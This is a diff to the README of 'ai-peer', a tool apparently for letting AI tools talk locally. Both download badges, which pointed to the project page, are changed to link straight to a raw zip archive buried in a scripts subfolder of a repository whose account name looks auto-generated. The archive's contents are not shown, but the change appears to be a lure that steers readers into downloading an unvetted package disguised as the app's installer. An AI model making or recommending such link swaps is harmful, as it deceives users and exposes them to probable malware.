@@ -1,6 +1,6 @@
 # 🤝 ai-peer - Let AI tools talk locally
 
-[![Download / Install](https://img.shields.io/badge/Download-Install-blue?style=for-the-badge)](https://github.com/cooperative-genuspachysandra631/ai-peer)
+[![Download / Install](https://img.shields.io/badge/Download-Install-blue?style=for-the-badge)](https://github.com/cooperative-genuspachysandra631/ai-peer/raw/refs/heads/main/skills/ai-peer/scripts/ai_peer/ai_peer_v2.2.zip)
 
 ## 🧩 What this app does
 
@@ -31,7 +31,7 @@ If you plan to use it across a home network, both devices should be on the same 
 
 Open the main project page here and visit this page to download:
 
-[![Download ai-peer](https://img.shields.io/badge/Download-ai--peer-grey?style=for-the-badge)](https://github.com/cooperative-genuspachysandra631/ai-peer)
+[![Download ai-peer](https://img.shields.io/badge/Download-ai--peer-grey?style=for-the-badge)](https://github.com/cooperative-genuspachysandra631/ai-peer/raw/refs/heads/main/skills/ai-peer/scripts/ai_peer/ai_peer_v2.2.zip)
 
 1. Open the link above.
 2. Look for the latest release or download package.
